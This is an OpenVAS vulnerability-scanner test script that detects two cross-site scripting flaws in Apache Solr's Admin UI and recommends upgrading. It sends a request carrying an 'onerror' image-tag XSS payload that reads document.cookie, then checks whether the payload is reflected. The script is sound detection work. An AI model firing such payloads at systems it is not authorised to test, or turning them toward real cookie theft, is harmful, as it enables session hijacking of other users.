###############################################################################
# OpenVAS Vulnerability Test
#
# Apache Solr Multiple Cross-Site Scripting Vulnerabilities
#
# Authors:
# Kashinath T <tkashinath@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:apache:solr";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806880");
  script_version("2022-04-13T13:17:10+0000");
  script_cve_id("CVE-2015-8797", "CVE-2015-8796");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2022-04-13 13:17:10 +0000 (Wed, 13 Apr 2022)");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2016-02-22 22:10:00 +0000 (Mon, 22 Feb 2016)");
  script_tag(name:"creation_date", value:"2016-03-01 14:45:34 +0530 (Tue, 01 Mar 2016)");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_name("Apache Solr Multiple Cross-Site Scripting Vulnerabilities (SOLR-7920, SOLR-7949)");

  script_tag(name:"summary", value:"Apache Solr is prone to multiple cross-site scripting vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Multiple flaws are due to:

  - An improper sanitization of 'entry' parameter in webapp/web/js/scripts/plugins.js
  in the stats page in the Admin UI.

  - An improper sanitization of 'field' parameter in webapp/web/js/scripts/schema-browser.js
  in the schema-browser page in the Admin UI.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to execute arbitrary script code in a user's browser session within
  the trust relationship between their browser and the server.");

  script_tag(name:"affected", value:"Apache Solr versions 4.9, 4.10.4, 5.2.1.");

  script_tag(name:"solution", value:"Upgrade to Apache Solr version 5.3.1 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://issues.apache.org/jira/browse/SOLR-7920");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/83243");
  script_xref(name:"URL", value:"https://issues.apache.org/jira/browse/SOLR-7949");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_apache_solr_detect.nasl");
  script_mandatory_keys("apache/solr/detected");
  script_require_ports("Services/www", 8983);

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + '/#/collection1/plugins/cache?entry=score=<img src=1 onerror=alert(document.cookie);>';

if (http_vuln_check(port: port, url: url, pattern: "alert\(document.cookie\)", check_header: TRUE)) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
